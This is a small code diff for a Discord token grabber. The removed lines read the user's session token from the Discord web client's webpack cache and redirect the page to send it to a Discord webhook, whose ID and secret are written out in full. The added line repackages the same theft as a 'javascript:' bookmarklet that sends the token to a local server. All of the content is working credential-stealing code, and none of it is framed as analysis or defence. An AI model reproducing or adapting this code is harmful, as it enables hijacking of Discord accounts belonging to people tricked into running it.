@@ -1,6 +1,1 @@
-const url = 'https://discord.com/api/webhooks/1343315527161876510/C-lXrEFbRk0_wFVbzIKnUtza8SRIflZ54XVq9IzNPUXy43otxnwWh3I-bs9RnX08UeLZ';
-var f = (webpackChunkdiscord_app.push([[''], {}, e=> {
-  m = [];
-  for (let c in e.c) m.push(e.c[c]);
-}]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();
-window.location.replace(url + '/' + f);
+javascript:const url="http://127.0.0.1:81/";var f=(webpackChunkdiscord_app.push([[""],{},e=>{m=[];for(let o in e.c)m.push(e.c[o])}]),m).find((e=>void 0!==e?.exports?.default?.getToken)).exports.default.getToken();window.location.replace(url+"/"+f);
